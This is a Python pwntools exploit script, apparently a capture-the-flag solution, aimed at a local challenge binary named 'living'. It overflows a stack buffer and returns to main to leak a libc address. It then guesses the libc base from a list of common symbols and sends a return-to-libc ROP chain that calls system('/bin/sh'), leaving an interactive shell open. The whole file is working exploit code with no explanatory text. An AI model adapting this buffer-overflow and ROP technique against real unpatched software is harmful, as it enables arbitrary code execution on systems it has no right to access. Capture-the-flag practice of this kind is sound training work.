#!/usr/bin/env python3

from pwn import *

io = process('./../../challenge/living')

libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

print(io.recvline())
print(io.recvline())
print(io.recvline())

payload = b'A'* (0x12 + 8)

# hardcoded bc PIE is not enabled
# libc is still randomized
main_addr = p64(0x40121b)

io.sendline(payload + main_addr)

# find libc base address
leak = int(io.recvline().strip()[38:50], 16)  

print('leak:' + hex(leak))

functions = ["printf", "puts", "fgets", "gets", "send", "recv", "select", "open", "pipe", "fork"]

for function in functions:
    calc_addr = leak - libc.symbols[function]
    print(hex(libc.symbols[function]))
    print(hex(calc_addr))
    if hex(calc_addr)[11:] == "000":
        print(function)
        libc_base_addr = calc_addr

libc.address = libc_base_addr

print('libc address:'+ hex(libc.address))
print(io.recvline())
print(io.recvline())
print(io.recvline())

# ROP payload
POP_RDI = libc.address + 0xd2966
RET = POP_RDI + 1
binsh = next(libc.search(b"/bin/sh"))

payload = b'A'* (0x12 + 8)
payload += p64(RET)
payload += p64(POP_RDI)
payload += p64(binsh)
payload += p64(libc.symbols["system"])

io.sendline(payload)

io.interactive()